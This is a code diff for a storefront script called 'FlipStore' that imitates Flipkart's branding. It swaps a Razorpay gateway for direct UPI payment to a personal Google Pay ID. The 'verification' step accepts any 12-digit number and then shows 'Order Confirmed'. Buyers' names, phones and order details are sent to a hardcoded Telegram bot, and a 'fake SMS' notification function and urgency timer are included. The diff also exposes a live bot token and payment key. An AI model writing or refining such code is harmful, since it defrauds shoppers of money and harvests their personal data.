@@ -2,8 +2,8 @@
 const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
 const TELEGRAM_CHAT_ID = "1815847082"; 
 
-// --- RAZORPAY CONFIGURATION ---
-const RAZORPAY_KEY_ID = "rzp_live_RonN88BXEVP9eA"; 
+// --- UPI CONFIGURATION ---
+const UPI_ID = "gpay-11265399414@okbizaxis"; 
 
 const products = [
     // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
@@ -370,7 +370,7 @@ function filterByCategory(category) {
     }
 }
 
-// 3. Render Grid
+// 3. Render Grid (With Ratings)
 function renderProducts(productList = products) {
     const container = document.getElementById('product-container');
     if (!container) return;
@@ -410,7 +410,7 @@ function renderProducts(productList = products) {
     });
 }
 
-// 4. Show Detail Page
+// 4. Show Detail Page (UPDATED WITH HISTORY PUSH)
 function showProductDetail(product) {
     history.pushState({view: 'product'}, '', '#product'); 
 
@@ -635,79 +635,63 @@ function backToAddress() {
     document.getElementById('step-address').classList.remove('hidden');
 }
 
-// --- HELPER TO LOAD SCRIPT DYNAMICALLY ---
-function loadRazorpayScript(src) {
-    return new Promise((resolve) => {
-        const script = document.createElement("script");
-        script.src = src;
-        script.onload = () => resolve(true);
-        script.onerror = () => resolve(false);
-        document.body.appendChild(script);
-    });
-}
+// --- UPDATED PAYMENT PROCESS WITH UTR ---
+function processPayment() {
+    const upiLink = `upi://pay?pa=${UPI_ID}&pn=FlipStore&am=${currentPrice}&cu=INR`;
+    
+    // Redirect to UPI App
+    window.location.href = upiLink;
 
-// --- UPDATED RAZORPAY PAYMENT ---
-async function processRazorpayPayment() {
-    // 1. Check if script is loaded, if not load it
-    if (typeof Razorpay === 'undefined') {
-        // Show loading or just wait
-        const res = await loadRazorpayScript("https://checkout.razorpay.com/v1/checkout.js");
-        if (!res) {
-            alert("Payment Gateway failed to load. Please check internet.");
-            return;
-        }
-    }
-
-    // 2. Setup Options
-    var options = {
-        "key": RAZORPAY_KEY_ID, 
-        "amount": Math.round(currentPrice * 100), // Ensure integer paise
-        "currency": "INR",
-        "name": "FlipStore",
-        "description": isCartOrder ? "Bulk Order" : currentProduct.name,
-        "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
-        "handler": function (response) {
-            completeOrder(response.razorpay_payment_id);
-        },
-        "prefill": {
-            "name": window.userDetails.name || "",
-            "contact": window.userDetails.phone || ""
-        },
-        "theme": {
-            "color": "#2874f0"
-        },
-        "modal": {
-            "ondismiss": function() {
-                console.log('Checkout form closed');
-            }
-        }
-    };
-
-    // 3. Open Razorpay
-    try {
-        var rzp1 = new Razorpay(options);
-        rzp1.on('payment.failed', function (response){
-            alert("Payment Failed: " + response.error.description);
-        });
+    // After a delay, show the "Enter UTR" Modal instead of direct success
+    setTimeout(() => {
+        closeModal(); // Close checkout modal
         
-        closeModal();
-        rzp1.open();
-    } catch (e) {
-        console.error("Razorpay Init Error:", e);
-        alert("Something went wrong. Please try again.");
-    }
+        const successModal = document.getElementById('successModal');
+        const content = successModal.querySelector('.modal-content');
+        
+        // Show UTR Input Form
+        content.innerHTML = `
+            <div style="text-align: center; padding: 20px;">
+                <h3 style="margin-bottom: 10px; color: #2874f0;">Verify Payment</h3>
+                <p style="color: #666; font-size: 13px; margin-bottom: 20px;">
+                    Please complete the payment in your UPI app and enter the <b>12-digit UTR / Reference ID</b> below to confirm your order.
+                </p>
+                
+                <input type="text" id="utr-input" placeholder="Enter 12-digit UTR/Ref No." maxlength="12" 
+                    style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 16px; letter-spacing: 1px;">
+                
+                <button onclick="verifyPayment()" style="width: 100%; background: #fb641b; color: white; border: none; padding: 12px; font-weight: bold; border-radius: 4px; cursor: pointer;">
+                    VERIFY & CONFIRM ORDER
+                </button>
+            </div>
+        `;
+        successModal.style.display = 'flex';
+    }, 5000); // Show popup after 5 seconds of clicking Pay
 }
 
-function completeOrder(paymentId) {
+function verifyPayment() {
+    const utrInput = document.getElementById('utr-input').value.trim();
+    
+    // Basic Validation: Check if it's 12 digits (Standard UPI UTR length)
+    if (utrInput.length !== 12 || isNaN(utrInput)) {
+        alert("Invalid UTR! Please enter a valid 12-digit transaction ID.");
+        return;
+    }
+
+    // If Valid, Process Order
+    completeOrder(utrInput);
+}
+
+function completeOrder(utr) {
     if(isCartOrder) { 
         cart = []; 
         updateCartCount(); 
     }
     
-    // 1. Send Telegram Message with Razorpay ID
+    // 1. Send Telegram Message with UTR
     let productDetails = isCartOrder ? `🛒 *BULK ORDER*` : `🛒 *Product:* ${currentProduct.name}`;
     const orderDetails = `
-✅ *ORDER CONFIRMED (Razorpay)* ✅
+✅ *ORDER CONFIRMED* ✅
 -------------------------
 👤 *Name:* ${window.userDetails.name}
 📱 *Phone:* ${window.userDetails.phone}
@@ -717,7 +701,7 @@ function completeOrder(paymentId) {
 ${productDetails}
 💰 *Amount:* ₹${currentPrice}
 -------------------------
-🆔 *Payment ID:* ${paymentId}
+🆔 *UTR/Ref:* ${utr}
     `;
     sendToTelegram(orderDetails);
 
@@ -732,13 +716,12 @@ ${productDetails}
             <div style="font-size: 50px; color: #388e3c; margin-bottom: 20px;"><i class="fas fa-check-circle"></i></div>
             <h2 style="color: #212121;">Order Confirmed!</h2>
             <p style="color: #666; margin-bottom: 20px;">Thank you for shopping with us.</p>
-            <p style="font-size: 12px; color: #888;">Transaction ID: ${paymentId}</p>
             <button onclick="closeSuccessAndHome()" style="width: 100%; background: #2874f0; color: white; border: none; padding: 12px; margin-top: 10px; cursor: pointer; border-radius: 2px;">Continue Shopping</button>
         </div>
     `;
-    successModal.style.display = 'flex';
 }
 
+// --- FAKE SMS ---
 function showFakeSMSNotification(msgContent) {
     let notif = document.getElementById('fake-sms-notification');
     if (!notif) {
@@ -772,14 +755,18 @@ function startTimer() {
 
 // INITIALIZE
 document.addEventListener('DOMContentLoaded', () => {
+    // --- MOBILE BACK BUTTON LISTENER ---
     window.addEventListener('popstate', function(event) {
+        // When back button is pressed, goHome() restores the home view
         goHome();
     });
+    // -----------------------------------
 
     renderCategories();
     renderProducts();
     startTimer();
 
+    // View All Button
     const viewAllBtn = document.querySelector('.view-all');
     if(viewAllBtn) {
         viewAllBtn.addEventListener('click', () => {
@@ -796,6 +783,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const sellerBtn = Array.from(document.querySelectorAll('.nav-links a')).find(el => el.innerText.includes('Become a Seller'));
     if(sellerBtn) sellerBtn.addEventListener('click', (e) => { e.preventDefault(); alert("Aap eligible nahi hai"); });
 
+    // Search
     const searchInput = document.querySelector('.search-bar input');
     if(searchInput) {
         searchInput.addEventListener('input', (e) => {
